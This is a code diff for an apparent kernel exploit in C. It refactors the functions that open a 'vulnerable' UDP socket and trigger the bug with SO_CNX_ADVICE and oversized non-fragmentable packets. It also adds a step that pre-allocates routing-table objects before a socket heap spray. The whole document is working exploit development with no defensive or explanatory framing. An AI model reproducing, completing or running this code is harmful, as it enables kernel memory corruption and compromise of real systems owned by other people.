@@ -277,12 +277,14 @@ int wait_for_socket_error(int socket_fd) {
     }
 }
 
-int open_connected_ipv4_udp_socket(const char *address_str) {
+#define PEER_ADDR "192.168.10.1"
+
+int open_connected_ipv4_udp_socket(const char *address_str, short port) {
     int socket_fd = SYSCHK(socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP));
 
     struct sockaddr_in addr = { 0 };
     addr.sin_family = AF_INET;
-    addr.sin_port = htons(6767);
+    addr.sin_port = htons(port);
     SYSCHK(inet_pton(AF_INET, address_str, &addr.sin_addr));
 
     SYSCHK(connect(socket_fd, (struct sockaddr*)&addr, sizeof(addr)));
@@ -291,7 +293,7 @@ int open_connected_ipv4_udp_socket(const char *address_str) {
 }
 
 int open_vuln_ipv4_udp_socket() {
-    int socket_fd = open_connected_ipv4_udp_socket("192.168.10.1");
+    int socket_fd = open_connected_ipv4_udp_socket(PEER_ADDR, 6767);
 
     // setting this mode means packets are always sent as non fragmentable
     int mode = IP_PMTUDISC_DO;
@@ -303,22 +305,6 @@ int open_vuln_ipv4_udp_socket() {
     u8 buf[256] = { 0 };
     SYSCHK(send(socket_fd, buf, sizeof(buf), 0));
     assert(wait_for_socket_error(socket_fd) == EMSGSIZE);
-
-    return socket_fd;
-}
-
-int testing_trigger_vuln() {
-    int socket_fd = open_connected_ipv4_udp_socket("192.168.10.1");
-
-    // // send 512 will trigger icmp send with some delay
-    // u8 buf[512] = { 0 };
-    // SYSCHK(send(socket_fd, buf, sizeof(buf), 0));
-
-    // temporary debug trigger
-    // int sixseven = 67;
-    // int sixnine = 69;
-    // SYSCHK(setsockopt(socket_fd, SOL_SOCKET, SO_CNX_ADVICE, &sixnine, sizeof(sixnine)));
-    // SYSCHK(setsockopt(socket_fd, SOL_SOCKET, SO_CNX_ADVICE, &sixseven, sizeof(sixseven)));
 
     return socket_fd;
 }
@@ -597,6 +583,13 @@ void try_run_main_exploit(TriggerCtx *ctx);
 #define DEBUG
 
 void trigger_vuln_loop() {
+    // pretrigger rtable object for incomming icmp packets to be allocated before spray
+    int peer_socket_fd = open_connected_ipv4_udp_socket(PEER_ADDR, 6767);
+    // force regular send and recv routes to be created
+    u8 tmp_buf = 67;
+    SYSCHK(write(peer_socket_fd, &tmp_buf, sizeof(tmp_buf)));
+    SYSCHK(read(peer_socket_fd, &tmp_buf, sizeof(tmp_buf)));
+
     // setup spray threads before anything else
     setup_spray();
 
@@ -631,15 +624,11 @@ void trigger_vuln_loop() {
 
     // spray sockets for setup
     open_many_sockets(ctx.pre_sockets, NUM_PRE_SOCKETS);
-#ifdef DEBUG
-    LOG("start trigger");
-    ctx.vuln_socket = testing_trigger_vuln();
-#else
     ctx.vuln_socket = open_vuln_ipv4_udp_socket();
-#endif
     open_many_sockets(ctx.post_sockets, NUM_POST_SOCKETS);
 
 #ifdef DEBUG
+    LOG("start trigger");
     int sixseven = 67;
     int sixnine = 69;
     SYSCHK(setsockopt(ctx.vuln_socket, SOL_SOCKET, SO_CNX_ADVICE, &sixnine, sizeof(sixnine)));
@@ -1039,6 +1028,10 @@ int main() {
 
     set_hard_file_limit(16384);
     set_soft_file_limit(16384);
+
+    // open_vuln_ipv4_udp_socket();
+    // for (;;) {}
+    // return 0;
 
     // test2();
     // return 0;
